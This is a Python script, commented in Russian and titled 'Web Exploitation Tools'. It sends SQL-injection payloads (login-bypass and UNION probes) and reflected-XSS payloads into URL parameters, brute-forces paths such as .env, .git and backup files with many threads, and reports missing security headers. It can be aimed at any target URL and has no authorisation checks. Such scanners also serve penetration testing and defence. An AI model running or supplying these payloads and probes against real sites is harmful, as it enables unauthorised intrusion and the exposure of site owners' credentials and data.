#!/usr/bin/env python3
"""
Web Exploitation Tools - Инструменты для тестирования веб-уязвимостей
"""

import requests
import argparse
import sys
import re
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from typing import List, Dict, Optional
from utils import *

class SQLInjectionTester:
    """Тестер SQL инъекций"""
    
    def __init__(self, url: str):
        self.url = url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
        
        # SQL инъекционные пейлоады
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            "' UNION SELECT 1,2,3--",
            "' AND 1=1--",
            "' AND 1=2--",
        ]
    
    def test_sql_injection(self, params: Dict[str, str]) -> List[Dict]:
        """Тестирование SQL инъекций"""
        print_info("Тестирование SQL инъекций...")
        vulnerabilities = []
        
        for param_name, param_value in params.items():
            for payload in self.payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = self.session.get(self.url, params=test_params, timeout=5)
                    
                    # Проверка признаков SQL ошибок
                    error_patterns = [
                        r"SQL syntax.*MySQL",
                        r"Warning.*mysql_",
                        r"MySQLSyntaxErrorException",
                        r"PostgreSQL.*ERROR",
                        r"Warning.*pg_",
                        r"SQLite.*exception",
                        r"Microsoft SQL Server",
                        r"ODBC SQL Server Driver",
                        r"ORA-[0-9]{5}",
                    ]
                    
                    for pattern in error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vuln = {
                                'type': 'SQL Injection',
                                'param': param_name,
                                'payload': payload,
                                'url': response.url
                            }
                            vulnerabilities.append(vuln)
                            print_warning(f"Возможная SQL инъекция в параметре: {param_name}")
                            print_info(f"Payload: {payload}")
                            break
                
                except Exception as e:
                    print_error(f"Ошибка при тестировании: {e}")
        
        return vulnerabilities

class XSSTester:
    """Тестер XSS уязвимостей"""
    
    def __init__(self, url: str):
        self.url = url
        self.session = requests.Session()
        
        # XSS пейлоады
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "'\"><img src=x onerror=alert('XSS')>",
        ]
    
    def test_xss(self, params: Dict[str, str]) -> List[Dict]:
        """Тестирование XSS уязвимостей"""
        print_info("Тестирование XSS...")
        vulnerabilities = []
        
        for param_name, param_value in params.items():
            for payload in self.payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = self.session.get(self.url, params=test_params, timeout=5)
                    
                    # Проверка отражения пейлоада
                    if payload in response.text:
                        vuln = {
                            'type': 'XSS (Reflected)',
                            'param': param_name,
                            'payload': payload,
                            'url': response.url
                        }
                        vulnerabilities.append(vuln)
                        print_warning(f"Возможная XSS в параметре: {param_name}")
                        print_info(f"Payload: {payload}")
                
                except Exception as e:
                    print_error(f"Ошибка при тестировании: {e}")
        
        return vulnerabilities

class DirectoryBruteforcer:
    """Брутфорс директорий и файлов"""
    
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.found_paths = []
        
        # Популярные директории и файлы
        self.common_paths = [
            'admin', 'login', 'administrator', 'dashboard',
            'panel', 'cpanel', 'wp-admin', 'phpmyadmin',
            'backup', 'backups', 'old', 'test', 'tmp',
            'uploads', 'upload', 'files', 'images',
            'config.php', 'config.inc.php', '.env', '.git',
            'robots.txt', 'sitemap.xml', '.htaccess',
            'readme.txt', 'README.md', 'CHANGELOG.md',
            'composer.json', 'package.json', 'Dockerfile',
        ]
    
    def bruteforce(self, wordlist: Optional[List[str]] = None, threads: int = 10):
        """Брутфорс директорий"""
        paths = wordlist if wordlist else self.common_paths
        print_info(f"Брутфорс {len(paths)} путей...")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(self.check_path, path): path for path in paths}
            
            for i, future in enumerate(as_completed(futures)):
                path, status, size = future.result()
                if status != 404:
                    self.found_paths.append((path, status, size))
                    print_success(f"Найдено: {path} [{status}] ({size} bytes)")
                progress_bar(i + 1, len(paths))
        
        print()
        return self.found_paths
    
    def check_path(self, path: str):
        """Проверка существования пути"""
        url = urljoin(self.base_url, path)
        try:
            response = self.session.get(url, timeout=5, allow_redirects=False)
            return (path, response.status_code, len(response.content))
        except:
            return (path, 0, 0)

class HeaderAnalyzer:
    """Анализ HTTP заголовков безопасности"""
    
    def __init__(self, url: str):
        self.url = url
        self.session = requests.Session()
    
    def analyze_headers(self) -> Dict:
        """Анализ заголовков безопасности"""
        print_info("Анализ заголовков безопасности...")
        
        try:
            response = self.session.get(self.url, timeout=5)
            headers = response.headers
            
            security_headers = {
                'X-Frame-Options': 'Защита от clickjacking',
                'X-Content-Type-Options': 'Защита от MIME sniffing',
                'X-XSS-Protection': 'XSS фильтр браузера',
                'Strict-Transport-Security': 'HSTS - принудительный HTTPS',
                'Content-Security-Policy': 'CSP - политика безопасности контента',
                'Referrer-Policy': 'Контроль referrer информации',
            }
            
            results = {'present': [], 'missing': []}
            
            for header, description in security_headers.items():
                if header in headers:
                    results['present'].append((header, headers[header], description))
                    print_success(f"{header}: {headers[header]}")
                else:
                    results['missing'].append((header, description))
                    print_warning(f"Отсутствует {header} - {description}")
            
            # Проверка информационных заголовков
            info_headers = ['Server', 'X-Powered-By']
            for header in info_headers:
                if header in headers:
                    print_warning(f"Раскрывается информация: {header}: {headers[header]}")
            
            return results
            
        except Exception as e:
            print_error(f"Ошибка анализа: {e}")
            return {}

class AdvancedWebScanner:
    """Продвинутый веб-сканер"""
    
    def __init__(self, url: str):
        self.url = url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
        self.vulnerabilities = []
    
    def comprehensive_scan(self) -> Dict:
        """Комплексное сканирование"""
        print_info(f"Комплексное сканирование: {self.url}")
        
        results = {
            'url': self.url,
            'vulnerabilities': [],
            'technologies': [],
            'forms': [],
            'endpoints': [],
            'security_issues': []
        }
        
        try:
            # Анализ технологий
            results['technologies'] = self._detect_technologies()
            
            # Поиск форм
            results['forms'] = self._find_forms()
            
            # Поиск эндпоинтов
            results['endpoints'] = self._find_endpoints()
            
            # Проверка безопасности
            results['security_issues'] = self._check_security_issues()
            
            # Тестирование уязвимостей
            results['vulnerabilities'] = self._test_vulnerabilities()
            
            print_success("Комплексное сканирование завершено")
            return results
            
        except Exception as e:
            print_error(f"Ошибка сканирования: {e}")
            return results
    
    def _detect_technologies(self) -> List[Dict]:
        """Определение технологий"""
        print_info("Определение технологий...")
        
        technologies = []
        
        try:
            response = self.session.get(self.url, timeout=10)
            headers = response.headers
            
            # Анализ заголовков
            tech_indicators = {
                'Server': 'Веб-сервер',
                'X-Powered-By': 'Язык программирования',
                'X-AspNet-Version': 'ASP.NET',
                'X-AspNetMvc-Version': 'ASP.NET MVC',
                'X-Drupal-Cache': 'Drupal',
                'X-Generator': 'CMS/Фреймворк'
            }
            
            for header, tech_type in tech_indicators.items():
                if header in headers:
                    technologies.append({
                        'type': tech_type,
                        'header': header,
                        'value': headers[header]
                    })
                    print_success(f"{tech_type}: {headers[header]}")
            
            # Анализ содержимого
            content = response.text.lower()
            
            if 'wordpress' in content:
                technologies.append({'type': 'CMS', 'name': 'WordPress'})
            if 'drupal' in content:
                technologies.append({'type': 'CMS', 'name': 'Drupal'})
            if 'joomla' in content:
                technologies.append({'type': 'CMS', 'name': 'Joomla'})
            
            return technologies
            
        except Exception as e:
            print_error(f"Ошибка определения технологий: {e}")
            return []
    
    def _find_forms(self) -> List[Dict]:
        """Поиск форм на странице"""
        print_info("Поиск форм...")
        
        forms = []
        
        try:
            response = self.session.get(self.url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for i, form in enumerate(soup.find_all('form')):
                form_info = {
                    'index': i,
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_info = {
                        'type': input_tag.get('type', 'text'),
                        'name': input_tag.get('name', ''),
                        'id': input_tag.get('id', ''),
                        'placeholder': input_tag.get('placeholder', '')
                    }
                    form_info['inputs'].append(input_info)
                
                forms.append(form_info)
                print_success(f"Форма {i+1}: {form_info['method']} {form_info['action']}")
            
            return forms
            
        except Exception as e:
            print_error(f"Ошибка поиска форм: {e}")
            return []
    
    def _find_endpoints(self) -> List[str]:
        """Поиск эндпоинтов"""
        print_info("Поиск эндпоинтов...")
        
        endpoints = []
        common_paths = [
            '/admin', '/login', '/wp-admin', '/administrator',
            '/api', '/api/v1', '/api/v2', '/rest', '/graphql',
            '/config', '/backup', '/test', '/debug',
            '/.env', '/.git', '/robots.txt', '/sitemap.xml'
        ]
        
        for path in common_paths:
            try:
                test_url = urljoin(self.url, path)
                response = self.session.get(test_url, timeout=5)
                
                if response.status_code == 200:
                    endpoints.append(path)
                    print_success(f"Найден эндпоинт: {path}")
                elif response.status_code in [301, 302]:
                    endpoints.append(f"{path} (редирект)")
                    print_warning(f"Редирект: {path}")
                    
            except:
                pass
        
        return endpoints
    
    def _check_security_issues(self) -> List[Dict]:
        """Проверка проблем безопасности"""
        print_info("Проверка проблем безопасности...")
        
        issues = []
        
        try:
            response = self.session.get(self.url, timeout=10)
            headers = response.headers
            
            # Проверка отсутствующих заголовков безопасности
            security_headers = [
                'X-Frame-Options', 'X-Content-Type-Options',
                'X-XSS-Protection', 'Strict-Transport-Security',
                'Content-Security-Policy'
            ]
            
            for header in security_headers:
                if header not in headers:
                    issues.append({
                        'type': 'missing_security_header',
                        'header': header,
                        'severity': 'medium',
                        'description': f'Отсутствует заголовок безопасности: {header}'
                    })
                    print_warning(f"Отсутствует: {header}")
            
            # Проверка информационных заголовков
            info_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
            for header in info_headers:
                if header in headers:
                    issues.append({
                        'type': 'information_disclosure',
                        'header': header,
                        'value': headers[header],
                        'severity': 'low',
                        'description': f'Раскрытие информации: {header}'
                    })
                    print_warning(f"Раскрытие: {header}: {headers[header]}")
            
            return issues
            
        except Exception as e:
            print_error(f"Ошибка проверки безопасности: {e}")
            return []
    
    def _test_vulnerabilities(self) -> List[Dict]:
        """Тестирование уязвимостей"""
        print_info("Тестирование уязвимостей...")
        
        vulnerabilities = []
        
        # SQL Injection тесты
        sqli_tester = SQLInjectionTester(self.url)
        if '?' in self.url:
            params = parse_qs(urlparse(self.url).query)
            sqli_vulns = sqli_tester.test_sql_injection(params)
            vulnerabilities.extend(sqli_vulns)
        
        # XSS тесты
        xss_tester = XSSTester(self.url)
        if '?' in self.url:
            params = parse_qs(urlparse(self.url).query)
            xss_vulns = xss_tester.test_xss(params)
            vulnerabilities.extend(xss_vulns)
        
        return vulnerabilities

def main():
    parser = argparse.ArgumentParser(
        description="Web Exploitation Tools",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Примеры:
  %(prog)s --url http://target.com/page.php?id=1 --test-sqli
  %(prog)s --url http://target.com/search?q=test --test-xss
  %(prog)s --url http://target.com --bruteforce
  %(prog)s --url http://target.com --analyze-headers
  %(prog)s --url http://target.com --test-all
        """
    )
    
    parser.add_argument('--url', required=True, help='Целевой URL')
    parser.add_argument('--test-sqli', action='store_true', help='Тест SQL инъекций')
    parser.add_argument('--test-xss', action='store_true', help='Тест XSS')
    parser.add_argument('--bruteforce', action='store_true', help='Брутфорс директорий')
    parser.add_argument('--analyze-headers', action='store_true', help='Анализ заголовков')
    parser.add_argument('--comprehensive-scan', action='store_true', help='Комплексное сканирование')
    parser.add_argument('--test-all', action='store_true', help='Все тесты')
    parser.add_argument('--params', help='Параметры в формате key=value,key2=value2')
    parser.add_argument('--threads', type=int, default=10, help='Количество потоков')
    parser.add_argument('--save', action='store_true', help='Сохранить результаты')
    
    args = parser.parse_args()
    
    print_banner("WEB EXPLOITATION TOOLS")
    
    all_results = {}
    
    # Парсинг параметров из URL или аргументов
    parsed_url = urlparse(args.url)
    params = parse_qs(parsed_url.query)
    params = {k: v[0] for k, v in params.items()}
    
    if args.params:
        param_pairs = args.params.split(',')
        for pair in param_pairs:
            k, v = pair.split('=')
            params[k] = v
    
    # Тесты
    if args.test_sqli or args.test_all:
        if params:
            sqli_tester = SQLInjectionTester(args.url)
            all_results['sqli'] = sqli_tester.test_sql_injection(params)
        else:
            print_warning("Нет параметров для тестирования SQL инъекций")
    
    if args.test_xss or args.test_all:
        if params:
            xss_tester = XSSTester(args.url)
            all_results['xss'] = xss_tester.test_xss(params)
        else:
            print_warning("Нет параметров для тестирования XSS")
    
    if args.bruteforce or args.test_all:
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        bruteforcer = DirectoryBruteforcer(base_url)
        all_results['directories'] = bruteforcer.bruteforce(threads=args.threads)
    
    if args.analyze_headers or args.test_all:
        analyzer = HeaderAnalyzer(args.url)
        all_results['headers'] = analyzer.analyze_headers()
    
    if args.comprehensive_scan or args.test_all:
        scanner = AdvancedWebScanner(args.url)
        all_results['comprehensive'] = scanner.comprehensive_scan()
    
    # Сохранение результатов
    if args.save and all_results:
        save_results(all_results, "web_exploit", "json")

if __name__ == "__main__":
    main()






